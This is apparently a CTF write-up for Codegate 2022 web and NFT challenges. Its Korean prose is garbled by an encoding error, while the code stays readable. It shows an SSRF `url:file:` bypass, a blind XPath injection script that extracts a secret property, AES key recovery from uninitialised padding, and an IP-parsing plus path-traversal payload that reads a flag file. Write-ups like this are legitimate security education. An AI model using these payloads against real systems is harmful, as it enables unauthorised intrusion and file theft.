---
title: "Codegate 2022 Web/Blockchain Writeup"
description: "Codegate 2022 ì˜ˆì„  Web ì „ì²´ ë¬¸ì œ ë° Blockchain(NFT) ë¬¸ì œ í’€ì´"
date: 2022-02-27
tags: ["codegate", "ssrf", "xpath-injection", "aes", "blockchain"]
ctf: "Codegate CTF 2022"
published: true
---

# Codegate 2022 Web(all)/Blockchain(nft) Write-up

ë³¸ì„  ëª»ê°”ìœ¼ë‹ˆ ëŒ€ì¶© ì“°ê² ë‹¤..
ì›¹ì„ ë„ˆë¬´ ë¹¨ë¦¬ í’€ì–´ì„œ ë¸”ì²´ë§Œ ë´¤ëŠ”ë° ê°œì¸ì ìœ¼ë¡œ ë¸”ì²´ì— ëŒ€í•´ ë„ˆë¬´ ëª°ë¼ì„œ ë§ì´ ì•„ì‰¬ìš´ ê°ì´ ìˆì—ˆë‹¤ í‘í‘..
nft ë¬¸ì œëŠ” íŒ€ì›ì¸ epistê°€ ë„ì™€ì¤¬ë‹¤ (ã„³ã„³)

---


## ğŸ“¸ ì›ë³¸ ì´ë¯¸ì§€

![Image 1](/images/writeups/codegate-2022-web-blockchain_4702c120.png)

![Image 2](/images/writeups/codegate-2022-web-blockchain_83ff0f40.png)

![Image 3](/images/writeups/codegate-2022-web-blockchain_393133c3.png)

![Image 4](/images/writeups/codegate-2022-web-blockchain_5a11d8a8.png)

![Image 5](/images/writeups/codegate-2022-web-blockchain_d5439748.png)

![Image 6](/images/writeups/codegate-2022-web-blockchain_bbd924f3.png)

![Image 7](/images/writeups/codegate-2022-web-blockchain_7d168b94.png)

![Image 8](/images/writeups/codegate-2022-web-blockchain_92b9f263.png)


## [Baby First]

### ìš”ì•½: SSRFë¡œ regex ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ì—¬ local fileì„ leakí•œë‹¤

ë‹¹ì—°íˆ baby ë¶™ì–´ìˆê¸¸ë˜ ì´ê±°ë¶€í„° ë´ì„œ ê·¸ëŸ°ì§€ **í¼ìŠ¤íŠ¸ ì†”ë¸Œ**ë¥¼ ë¨¹ì–´ë²„ë¦° ë¬¸ì œì´ë‹¤ ;;;

ëŒ€ì¶© ì½”ë“œ ë³´ë©´ class íŒŒì¼ ë‚´ì˜ `lookupImg` í•¨ìˆ˜ì—ì„œ memoì˜ ë‚´ìš© ì¤‘ `[]` ëŒ€ê´„í˜¸ ì•ˆì— ë“¤ì–´ê°€ëŠ”ê±¸ urlë¡œ ë°›ì•„ imageë¥¼ íŒŒì‹±í•´ì„œ img tagì— ë„£ì–´ì¤€ë‹¤.

```java
pattern = Pattern.compile("^[a-z]+:");
matcher = pattern.matcher(tmp);
if (!matcher.find() || matcher.group().startsWith("file"))
    return "";
```

ì´ ë•Œ `java.net.URL`ì„ ì‚¬ìš©í•´ì„œ ë„£ì–´ì£¼ëŠ”ë°, ê·¸ ì „ì— `startsWith` í•¨ìˆ˜ë¡œ `file:` í”„ë¡œí† ì½œë¡œ ì‹œì‘í•˜ëŠ”ì§€ ê²€ì‚¬í•œë‹¤.

`java.net.URL`ì„ auditing í•´ë³´ë©´ `url:` ë¡œ ì‹œì‘í•˜ë©´ startë¥¼ `+= 4` í•´ì£¼ëŠ”ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.

**Solution:**
```
memo=[url:file:///flag]
```

---

## [Second]

### ìš”ì•½: XSS botì— admin passwordê°€ ì¡´ì¬í•œë‹¤(ì–¸ì¸í…), parse_url ë²„ê·¸ë¥¼ ì´ìš©í•œë‹¤(ì¸í…)

```php
case 'iframe':
    $src = $element->src;
    $host = parse_url($src)['host'];
    if (strpos($host, 'youtube.com') !== false) {
        $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
    }
    break;
```

`parse_url($src)['host']`ë¡œ host ê²€ì‚¬ë¥¼ í•˜ëŠ”ë°, ì´ëŠ” ì‰½ê²Œ ìš°íšŒê°€ ê°€ëŠ¥í•˜ë‹¤.
ê´€ë ¨ëœ ë¬¸ì„œë¡œëŠ” ì˜¤ëœì§€ í˜•ë‹˜ ìë£Œê°€ ì°¸ ì¢‹ë‹¤.

### ì–¸ì¸í…

```python
# xss bot python code
driver.get('http://3.39.55.38:1929/login')
driver.find_element_by_id('id').send_keys('admin')
driver.find_element_by_id('pw').send_keys('$MiLEYEN4')  ## ????
driver.find_element_by_id('submit').click()
```

í•˜íŠ¼ ì›ë˜ëŠ” ê·¸ëŸ°ë¬¸ì œì˜€ì§€ë§Œ **xss botì— íŒ¨ìŠ¤ì›Œë“œê°€ ë“¤ì–´ìˆì—ˆë‹¤**.

ì¸í…ìœ¼ë¡œëŠ” ëŒ€ì¶© `javascript://youtube.com/[ê°œí–‰][ì½”ë“œ]`ë¡œ í•˜ë©´ ë ê±°ê°™ë‹¤.

---

## [Third]

### ìš”ì•½: admin/password (ì–¸ì¸í…), AES uninitialized key+padding it, iv from key decrypt

ë‚œ ì†”ì§íˆ ëŒ€íšŒí•˜ë©´ì„œ ì´ë¬¸ì œê°€ ì™œ 100ì ê¹Œì§€ í„¸ë ¸ì§€ë¼ëŠ” ì˜ë¬¸ì„ ëëë‚´ ì§€ìš¸ ìˆ˜ê°€ ì—†ì—ˆë‹¤.
ì•„ ê·¸ëŸ°ë° ëŒ€íšŒê°€ ëë‚˜ê³ ë³´ë‹ˆ ê³„ì •ì´ **admin/password** ì˜€ë‹¤ê³ í•œë‹¤. ìœ¼..;

```bash
$ nc 3.39.49.174 30001
GET /admin/authkey HTTP/1.2
Host: localhost

HTTP/1.1 200 OK
00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```

ì¼ë‹¨ auth_keyë¥¼ auth_secret_keyë¡œ AES CBC Encryptí•´ì„œ admin í˜ì´ì§€ì— ë¿Œë ¤ì¤€ë‹¤.
host localhostë¡œ ê²€ì‚¬í•˜ê³ ìˆì§€ë§Œ ê± ì§ì ‘ ncë¡œ ë¶™ì–´ì„œ host ë°”ê¿”ì£¼ë‹ˆ ëš ë–¨ì–´ì¡Œë‹¤.

ëŒ€ì¶© ì½”ë“œ ë³´ë©´ ì•”í˜¸í™”í• ë•Œ ì“°ì´ëŠ” `auth_crypt_key`ê°€ **ì„ ì–¸ë§Œ ë˜ì–´ìˆê³  ê°’ì„ ë¶ˆëŸ¬ì˜¤ì§€ ì•ŠëŠ”ë‹¤**.

```go
func AesEncrypt(origData, key []byte) ([]byte, error) {
    padded_key := Padding(key, 16)  // \x10*16
    block, err := aes.NewCipher(padded_key)
    // ...
    blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
    // ...
}
```

keyì™€ ivê°€ ëª¨ë‘ `\x10*16`ì´ë¯€ë¡œ ë³µí˜¸í™” ê°€ëŠ¥!

```
$ python3 a.py
b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
```

---

## [Fourth]

### ìš”ì•½: Blind XPath Injectionìœ¼ë¡œ catalina.propertiesì— ì„¤ì •ëœ í™˜ê²½ë³€ìˆ˜ leak

ì´ì œ jsp ë¬¸ì œ ë‚˜ì˜¤ë©´ ì¼ë‹¨ í†°ìº£, jdkë¶€í„° ì˜¤ë””íŒ…í•˜ëŠ” ìŠµê´€ì´ ë“¤ì–´ì ¸ë²„ë ¸ë‹¤.

ëŒ€ì¶© catalina.propertiesì— í”Œë˜ê·¸ ì„¸íŒ…í•´ì¤€ê±° ë³´ë‹ˆ `System.getProperty` ê°™ì€ í•¨ìˆ˜ê°€ xpath ì‚¬ìš©í•  ë•Œ ë‚´ë¶€ì ìœ¼ë¡œ ì“¸ê±°ë¼ ìƒê°ì´ ë“¤ì–´ ctrl+shift+fë¡œ getProperty ê²€ìƒ‰í•´ì„œ reference checkë¥¼ í–ˆë‹¤.

**XPathì—ì„œ system-property í•¨ìˆ˜ ë°œê²¬!**

```
http://3.39.79.180/blog/read?idx=' or @idx=string-length(string-length(system-property('flag'))=46='true')-4 and @idx='1
```

ëŒ€ì¶© blind xpath injection êµ¬ë¬¸ ì§œì„œ length checkí•˜ê³ :

```python
from arang import *

s = requests.session()
headers = {"Cookie": "JSESSIONID=C37A435A55859F879AC71B4ECE966C07"}
s.headers = headers

flag = "codegate2022{"
for i in range(len(flag)+1, 46+1):
    for c in "0123456789abcdef}":
        url = f"http://3.39.79.180/blog/read?idx=' or @idx=string-length(substring(system-property('flag'),{i},1)='{c}'='true')-4 and @idx='1"
        r = s.get(url)
        if 'asdf' not in r.content.decode():
            flag += c
            print(f"[{len(flag)}/46] flag - {flag}")
            break
```

---

## [NFT] Blockchain

### ìš”ì•½: Blockchainì´ì§€ë§Œ webchall, 1dayë‘ python trick ì´ìš©

```solidity
modifier contains (string memory what, string memory where) {
    bytes memory whatBytes = bytes (what);
    bytes memory whereBytes = bytes (where);
    require(whereBytes.length >= whatBytes.length);
    // ... ì—‰ì„±í•œ contains êµ¬í˜„
}
```

contains í•¨ìˆ˜ê°€ ì¢€ ì—‰ì„±í•˜ë‹¤.

**requirements.txt:** Django==3.2.1

**CVE-2021-33571** ë°œê²¬!

```python
>>> ipaddress.IPv4Address("127.0.0.01")
IPv4Address('127.0.0.1')
```

ì´ì œ `127.00.0.1` ì£¼ë©´ contains ìš°íšŒí•  ìˆ˜ ìˆë‹¤.

**os.path.join íŠ¸ë¦­:**

```python
>>> uri = "1.1.1.1/account/storages//a.b.c"
>>> nft_file = uri.split(nft_path + '/')[-1]
>>> nft_file
'/a.b.c'
>>> path = os.path.join(os.getcwd(), nft_path, nft_file)
>>> path
'/a.b.c'
```

`os.path.join` ì“¸ ë•Œ ì„¸ë²ˆì§¸ ì¸ì ì ˆëŒ€ê²½ë¡œ ì£¼ë©´ ì ˆëŒ€ê²½ë¡œë¡œ ë°”ë€Œì–´ë²„ë¦¬ëŠ” trick!

**Payload:**
```
127.00.0.1/account/storages//home/ctf/flag.txt
```

ì·¨ì•½ì ì€ ì°¾ì•˜ìœ¼ë‚˜ ë¸”ì²´ ëˆ•ëˆ•ì´ë¼ ì‹¤ì œ ìµìŠ¤ë¥¼ ëª»í•´ì„œ íŒ€ì›ì¸ epistê°€ ëŒ€ì‹  ìµìŠ¤í•´ì¤¬ë‹¤ (ã„³ã„³)
